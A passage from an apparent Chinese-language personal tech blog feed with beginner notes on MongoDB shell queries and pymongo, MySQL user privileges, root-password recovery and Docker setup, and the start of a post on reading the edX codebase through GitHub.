&lt;p&gt;关系数据库是在&lt;code&gt;表&lt;/code&gt;这一层次定义&lt;code&gt;列&lt;/code&gt;的，而一个面向文档的数据库则是在&lt;code&gt;文档&lt;/code&gt;这一层次定义&lt;code&gt;域&lt;/code&gt;的。也就是说，集合中的每个文档都可以有独立的域。因此，虽说集合相对于表来说是一个简化了的容器，而文档则包含了比行要多得多的信息。&lt;/p&gt;
&lt;h2&gt;mongo shell&lt;/h2&gt;
&lt;h3&gt;入口&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;help&lt;/code&gt;。shell会返回全局可用的操作。比如&lt;code&gt;show dbs&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Mongo的shell运行在JavaScript之上.&lt;br /&gt;
您可以执行一些全局的指令，如help或者exit.&lt;br /&gt;
操作对象db来执行针对当前数据库的操作，例如db.help()或是db.stats()。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;首先我们用全局命令use来切换数据库。输入&lt;code&gt;use learn&lt;/code&gt;。这个数据库是否存在并没有关系，若不存在则新建.z执行完后您就已经在一个数据库里面了&lt;/li&gt;
&lt;li&gt;&lt;code&gt;db.unicorns.insert({name: 'Aurora', gender: 'f', weight: 450})&lt;/code&gt;&lt;br /&gt;
以上命令对unicorns对象执行insert操作，并传入一个参数。在MongoDB内部，数据是以二进制的串行JSON格式存储的。  &lt;/li&gt;
&lt;li&gt;如果我们现在执行db.getCollectionNames()，将看到两个集合：unicorns以及system.indexes。system.indexes在每个数据库中都会创建，它包含了数据库中的索引信息。&lt;/li&gt;
&lt;li&gt;现在您可以对unicorns对象执行find命令，  列出所有文档:&lt;code&gt;db.unicorns.find()&lt;/code&gt;&lt;br /&gt;
请注意，除了您在文档中输入的各个域，还有一个一个叫做_id的域。&lt;/li&gt;
&lt;li&gt;往unicorns插入一个完全不同的文档。&lt;code&gt;db.unicorns.insert({name: 'Leto', gender: 'm', home: 'Arrakeen', worm: false})&lt;/code&gt;再次用find可以列出所有的文档&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;掌握选择器（selector）&lt;/h3&gt;
&lt;p&gt;MongoDB还有一个很实用的概念：查询选择器（query selector）。&lt;br /&gt;
MongoDB的查询选择器就像SQL代码中的where语句。&lt;br /&gt;
因此您可以用它在集合中查找，统计，更新或是删除文档。&lt;br /&gt;
选择器就是一个JSON对象，最简单的形式就是{}，用来匹配所有的文档。&lt;br /&gt;
如果我们需要找到所有雌性的独角兽(unicorn)，我们可以用选择器{gender:'f'}来匹配。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用&lt;code&gt;db.unicorns.remove&lt;/code&gt;删除之前我们在unicorns集合中输入的所有数据 &lt;/li&gt;
&lt;li&gt;插入以下数据:  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;db.unicorns.insert({name: &amp;#39;Horny&amp;#39;, dob: new Date(1992,2,13,7,47), loves: [&amp;#39;carrot&amp;#39;,&amp;#39;papaya&amp;#39;], weight: 600, gender: &amp;#39;m&amp;#39;, vampires: 63});
db.unicorns.insert({name: &amp;#39;Aurora&amp;#39;, dob: new Date(1991, 0, 24, 13, 0), loves: [&amp;#39;carrot&amp;#39;, &amp;#39;grape&amp;#39;], weight: 450, gender: &amp;#39;f&amp;#39;, vampires: 43});
db.unicorns.insert({name: &amp;#39;Unicrom&amp;#39;, dob: new Date(1973, 1, 9, 22, 10), loves: [&amp;#39;energon&amp;#39;, &amp;#39;redbull&amp;#39;], weight: 984, gender: &amp;#39;m&amp;#39;, vampires: 182});
db.unicorns.insert({name: &amp;#39;Roooooodles&amp;#39;, dob: new Date(1979, 7, 18, 18, 44), loves: [&amp;#39;apple&amp;#39;], weight: 575, gender: &amp;#39;m&amp;#39;, vampires: 99});
db.unicorns.insert({name: &amp;#39;Solnara&amp;#39;, dob: new Date(1985, 6, 4, 2, 1), loves:[&amp;#39;apple&amp;#39;, &amp;#39;carrot&amp;#39;, &amp;#39;chocolate&amp;#39;], weight:550, gender:&amp;#39;f&amp;#39;, vampires:80});
db.unicorns.insert({name:&amp;#39;Ayna&amp;#39;, dob: new Date(1998, 2, 7, 8, 30), loves: [&amp;#39;strawberry&amp;#39;, &amp;#39;lemon&amp;#39;], weight: 733, gender: &amp;#39;f&amp;#39;, vampires: 40});
db.unicorns.insert({name:&amp;#39;Kenny&amp;#39;, dob: new Date(1997, 6, 1, 10, 42), loves: [&amp;#39;grape&amp;#39;, &amp;#39;lemon&amp;#39;], weight: 690,  gender: &amp;#39;m&amp;#39;, vampires: 39});
db.unicorns.insert({name: &amp;#39;Raleigh&amp;#39;, dob: new Date(2005, 4, 3, 0, 57), loves: [&amp;#39;apple&amp;#39;, &amp;#39;sugar&amp;#39;], weight: 421, gender: &amp;#39;m&amp;#39;, vampires: 2});
db.unicorns.insert({name: &amp;#39;Leia&amp;#39;, dob: new Date(2001, 9, 8, 14, 53), loves: [&amp;#39;apple&amp;#39;, &amp;#39;watermelon&amp;#39;], weight: 601, gender: &amp;#39;f&amp;#39;, vampires: 33});
db.unicorns.insert({name: &amp;#39;Pilot&amp;#39;, dob: new Date(1997, 2, 1, 5, 3), loves: [&amp;#39;apple&amp;#39;, &amp;#39;watermelon&amp;#39;], weight: 650, gender: &amp;#39;m&amp;#39;, vampires: 54});
db.unicorns.insert({name: &amp;#39;Nimue&amp;#39;, dob: new Date(1999, 11, 20, 16, 15), loves: [&amp;#39;grape&amp;#39;, &amp;#39;carrot&amp;#39;], weight: 540, gender: &amp;#39;f&amp;#39;});
db.unicorns.insert({name: &amp;#39;Dunx&amp;#39;, dob: new Date(1976, 6, 18, 18, 18), loves: [&amp;#39;grape&amp;#39;, &amp;#39;watermelon&amp;#39;], weight: 704, gender: &amp;#39;m&amp;#39;, vampires: 165});
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;{field: value}用来查找所有field等于value的文档。通过{field1: value1, field2: value2}的形式可以实现与操作。&lt;code&gt;$lt&lt;/code&gt;、&lt;code&gt;$lte&lt;/code&gt;、&lt;code&gt;$gt&lt;/code&gt;、&lt;code&gt;$gte&lt;/code&gt;以及&lt;code&gt;$ne&lt;/code&gt;分别表示&lt;code&gt;小于、小于或等于、大于、大于或等于以及不等于&lt;/code&gt;。举个例子，查找所有体重超过700磅的雄性独角兽的命令是：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;db.unicorns.find({gender: &amp;#39;m&amp;#39;, weight: {$gt: 700}})
//或者 (效果并不完全一样，仅用来为了演示不同的方法)
db.unicorns.find({gender: {$ne: &amp;#39;f&amp;#39;}, weight: {$gte: 701}})
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果需要或而不是与，可以用$or操作符并作用于需要进行或操作的数组：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;db.unicorns.find({gender: &amp;#39;f&amp;#39;, $or: [{loves: &amp;#39;apple&amp;#39;}, {loves: &amp;#39;orange&amp;#39;}, {weight: {$lt: 500}}]})
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a href="https://github.com/justinyhuang/the-little-mongodb-book-cn/blob/master/mongodb.md#%E6%9C%AC%E7%AB%A0%E5%B0%8F%E7%BB%93"&gt;go on ...&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;pymongo&lt;/h2&gt;
&lt;h3&gt;参考子资料&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.chinaunix.net/uid-670606-id-3574914.html"&gt;pymongo 使用小结&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/libingql/archive/2011/06/15/2081545.html"&gt;PyMongo基本使用&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/wwj718/534c6d343b25c210faf8"&gt;pymongo_operate.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;代码片段：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#首先pip install pymongo&lt;/span&gt;
&lt;span class="c1"&gt;#连接mongodb&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pymongo&lt;/span&gt;
&lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pymongo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Connection&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;27017&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#获取数据库列表&lt;/span&gt;
&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;database_names&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;u&amp;#39;test1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;u&amp;#39;test2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;u&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;u&amp;#39;local&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="c1"&gt;#连接数据库&lt;/span&gt;
&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;test1&lt;/span&gt;  &lt;span class="c1"&gt;#或者db = conn[&amp;#39;test1&amp;#39;]&lt;/span&gt;
&lt;span class="c1"&gt;#权限验证&lt;/span&gt;
&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;authenticate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="bp"&gt;True&lt;/span&gt;
&lt;span class="c1"&gt;#获取聚集列表 (聚集的概念类似于关系型数据库中的表)&lt;/span&gt;
&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;collection_names&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;u&amp;#39;account&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;u&amp;#39;role&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;u&amp;#39;item&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;u&amp;#39;online&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="c1"&gt;#连接聚集&lt;/span&gt;
&lt;span class="n"&gt;account&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;account&lt;/span&gt; &lt;span class="c1"&gt;#或account = db[&amp;#39;account&amp;#39;]&lt;/span&gt;
&lt;span class="c1"&gt;#查看聚集的一条记录&lt;/span&gt;
&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find_one&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;#查看聚集的所有key (类似于关系型数据库中的字段)&lt;/span&gt;
&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find_one&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;#查看聚集的所有记录&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;rint&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;
&lt;span class="c1"&gt;#查看记录总数&lt;/span&gt;
&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;#根据条件查询多条记录&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;xxx&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}):&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;
&lt;span class="c1"&gt;#对查询结果进行排序 (默认升序ASCENDING)&lt;/span&gt;
&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pymongo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCENDING&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;([(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pymongo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCENDING&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;active_time&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pymongo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DESCENDING&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;

&lt;span class="c1"&gt;#新增记录&lt;/span&gt;
&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;mike&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;active_time&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;20130408&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;

&lt;span class="c1"&gt;#更新记录&lt;/span&gt;
&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;mike&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$set&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;active_time&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;20130408120000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}})&lt;/span&gt;
&lt;span class="c1"&gt;#删除记录 (不带条件表示全部删除)&lt;/span&gt;
&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;mike&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;数据备份&lt;/h1&gt;
&lt;h2&gt;参开资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/justinyhuang/the-little-mongodb-book-cn/blob/master/mongodb.md"&gt;the-little-mongodb-book&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.mongodb.org/manual/"&gt;官方文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/xumingxiang/archive/2012/04/08/2437468.html"&gt;MongoDB开发学习（1）开天辟地，经典入门&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 19 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-19:learn-mongo.html</guid><category>edx</category></item><item><title>mysql学习笔记</title><link>/learn-mysql.html</link><description>&lt;p&gt;edx生产环境使用了mongo/mysql数据库。&lt;/p&gt;
&lt;p&gt;edx中这两个数据库都用来干嘛呢，看&lt;a href="https://github.com/edx/edx-platform/wiki/Frequently-Asked-Questions#are-the-cms-and-lms-supposed-to-use-the-same-database-or-separate-ones-when-in-production"&gt;这里&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;mysql/RDS for user-data and MongoDB for courseware content and discussion forums&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;既然总结了mongo，也顺便对mysql做个总结。&lt;/p&gt;
&lt;h2&gt;mysql安装&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;sudo apt-get install mysql-server&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;一路回车，root密码为空&lt;/p&gt;
&lt;h2&gt;卸载（可能是为了重装）&lt;/h2&gt;
&lt;p&gt;sudo apt-get purge mysql-server mysql-client mysql-common mysql-client mysql-server&lt;/p&gt;
&lt;h2&gt;管理&lt;/h2&gt;
&lt;h3&gt;权限管理&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CREATE USER username IDENTIFIED BY 'password'; //之后要使用GRANT分配权限，否则登录会错误，所以一般用下边的指令&lt;/li&gt;
&lt;li&gt;GRANT ALL PRIVILEGES ON wordpress.* TO 'username'@'localhost' IDENTIFIED BY 'password'; //创建并赋予用户在wordpress数据库中的所有权限&lt;/li&gt;
&lt;li&gt;GRANT ALL PRIVILEGES ON wordpress.* TO 'username'@'%' IDENTIFIED BY 'password'; //任意ip，注意需要把/etc/mysql/my.cnf的bind-address 注释&lt;/li&gt;
&lt;li&gt;GRANT SELECT, UPDATE ON wordpress.* TO 'username'@'localhost' IDENTIFIED BY 'password'; //只能执行 select 和 update 命令&lt;/li&gt;
&lt;li&gt;GRANT Select ON &lt;em&gt;.&lt;/em&gt; TO reader@192.168.1.123  IDENTIFIED BY "123456" //创建用户reader，只能从192.168.1.123访问，权限为所有数据库只读&lt;/li&gt;
&lt;li&gt;REVOKE ALL PRIVILEGES ON &lt;em&gt;.&lt;/em&gt; FROM 'username'@'localhost'; //回收所有权限&lt;/li&gt;
&lt;li&gt;查看所有用户：select host,user,password from mysql.user;&lt;/li&gt;
&lt;li&gt;删除用户：drop user 'jack'@'localhost';&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;权限相关的细节参考&lt;a href="https://libuchao.com/2013/04/06/mysql-user-and-privilege"&gt;MySQL 用户管理及权限管理&lt;/a&gt; 、&lt;a href="http://www.cnblogs.com/cnblogsfans/archive/2009/09/21/1570942.html"&gt;Mysql初始化root密码和允许远程访问&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;创建数据库&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;CREATE&lt;/span&gt; &lt;span class="k"&gt;DATABASE&lt;/span&gt; &lt;span class="n"&gt;mytest&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--创建数据库&lt;/span&gt;
&lt;span class="n"&gt;USE&lt;/span&gt; &lt;span class="n"&gt;mytest&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--进入数据库&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;删除关联表&lt;/h3&gt;
&lt;p&gt;暂时弃用检查： &lt;code&gt;SET FOREIGN_KEY_CHECKS=0;&lt;/code&gt;,完成之后 &lt;code&gt;SET FOREIGN_KEY_CHECKS=1;&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;重设root 密码&lt;/h3&gt;
&lt;p&gt;以安全模式启动mysql，这样不需要密码可以直接以root身份登录，然后重设密码。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo service mysql stop 
sudo mysqld_safe --skip-grant-tables --skip-networking &amp;amp;
mysql -u root  

mysql&amp;gt; use mysql;  
mysql&amp;gt; update user set password=PASSWORD(&amp;quot;mynewpassword&amp;quot;) where User=&amp;#39;root&amp;#39;;  
mysql&amp;gt; flush privileges;  
mysql &amp;gt; quit  

sudo service mysql restart 
mysql -u root -pmynewpassword  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;也可以直接修改&lt;code&gt;/etc/mysql/debian.cnf&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;数据备份&lt;/h2&gt;
&lt;p&gt;参考&lt;a href="http://blog.just4fun.site/edx-data-migrate.html"&gt;edx数据迁移&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;gui工具&lt;/h2&gt;
&lt;p&gt;MySQLWorkbench&lt;/p&gt;
&lt;h2&gt;数据&lt;/h2&gt;
&lt;p&gt;MYSQL默认的数据文件存储目录为/var/lib/mysql，在docker中可能这个信息有用（-v）&lt;/p&gt;
&lt;h2&gt;docker&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/docker-library/mysql"&gt;docker-library/mysql&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hub.docker.com/_/mysql/"&gt;the Docker Hub page&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/docker-library/docs/tree/master/mysql"&gt;docker-library/docs/mysql&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;run it&lt;/h4&gt;
&lt;p&gt;docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;some-mysql&lt;/code&gt; is the name you want to assign to your container&lt;/li&gt;
&lt;li&gt;&lt;code&gt;my-secret-pw&lt;/code&gt; is the password to be set for the MySQL &lt;code&gt;root&lt;/code&gt; user &lt;/li&gt;
&lt;li&gt;&lt;code&gt;tag&lt;/code&gt; is the tag specifying the MySQL version you want tags.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;既有数据问题&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;采用同版本mysql&lt;/li&gt;
&lt;li&gt;挂载/var/lib/mysql和/etc/mysql/conf.d，是否可能完全一样，换句话说这两个是文件，直接复制是否可用，相同的操作系统的话&lt;/li&gt;
&lt;li&gt;做个试验，设立新的用户，然后migrate，或者重跑ansible playbook&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://user.frdm.info/ckhung/b/sa/mysql.php"&gt;mysql逃兵筆記&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/wuhou/archive/2008/09/28/1301071.html"&gt;Ubuntu安装配置Mysql&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/hateislove214/archive/2010/11/05/1869889.html"&gt;MYSQL常用命令&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/mr-wid/archive/2013/05/09/3068229.html"&gt;21分钟 MySQL 入门教程&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 19 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-19:learn-mysql.html</guid><category>edx</category></item><item><title>利用github来深入源码</title><link>/github-edx.html</link><description>&lt;p&gt;最近在折腾edx，edx是我截至目前，见过最庞大的django项目。麻省理工和哈佛大学在这个项目中各资助了三千万美元，代码量可想而知。&lt;/p&gt;
&lt;p&gt;在错综复杂的源码森林里，如何行走，不至于迷失，而能有所收获是个很普遍的问题。&lt;/p&gt;
&lt;p&gt;读别人代码和自个儿写代码是很不相同的。读人家代码，有时你会有一种想揍作者的感觉。其实许多时候是你习惯以己度人而已。&lt;/p&gt;
&lt;p&gt;试着去理解而不是急着去批评。我想这应当作为我们的起点。其实又岂止适用于读代码。&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;那么我们该如何阅读别人的代码。&lt;/p&gt;
&lt;p&gt;此类问题，知乎中有几个回答不错，值得一读。&lt;a href="http://www.zhihu.com/question/21186887"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;此外也推荐&lt;a href="http://book.douban.com/subject/1151672/"&gt;这本书&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们今天不谈论源码阅读的艺术，只谈论如何利用github来帮助我们阅读代码。&lt;/p&gt;
&lt;p&gt;泡上一杯咖啡，我们开始吧～&lt;/p&gt;
&lt;h2&gt;为何使用github来阅读源码&lt;/h2&gt;
&lt;h3&gt;托管了世界上绝大多的开源代码库&lt;/h3&gt;
&lt;h3&gt;完整的资料，源码，文档，issue...&lt;/h3&gt;
&lt;h3&gt;代码高亮&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img alt="0" src="http://wwjpic.qiniudn.com/light.png" /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;库内搜索&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img alt="1" src="http://wwjpic.qiniudn.com/search.png" /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gist做代码片段笔记&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img alt="2" src="http://wwjpic.qiniudn.com/gist.png" /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;fork项目,之后使用fork库中的wiki来记录阅读笔记&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img alt="3" src="http://wwjpic.qiniudn.com/wiki.png" /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;使用url精确定位到行数&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img alt="4" src="http://wwjpic.qiniudn.com/code-url.png" /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;如何使用&lt;/h2&gt;
&lt;p&gt;大家可以看下我阅读edx项目时做的&lt;a href="https://github.com/wwj718/wwj718.github.com/wiki/edx%E8%AF%BE%E7%A8%8B%E6%90%9C%E7%B4%A2"&gt;wiki&lt;/a&gt;&lt;/p&gt;
